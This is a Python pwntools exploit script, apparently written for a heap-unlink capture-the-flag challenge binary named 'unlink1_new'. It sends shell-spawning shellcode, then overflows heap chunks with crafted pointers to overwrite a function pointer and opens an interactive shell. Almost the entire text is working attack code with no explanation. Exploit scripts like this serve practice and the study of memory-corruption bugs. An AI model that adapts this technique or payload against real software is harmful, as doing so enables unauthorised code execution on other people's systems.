#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./unlink1_new")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break main
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

function_pointer = 0x404058
ret = 0x40149f
array = 0x404080

sl(asm(shellcraft.sh())[:49])
pause()
sl("A"*0x20)
pause()
sl("C"*0x20)
pause()
sl("B"*0x20+"XXXX"+p64(array)+p64(function_pointer-0x28))

io.interactive()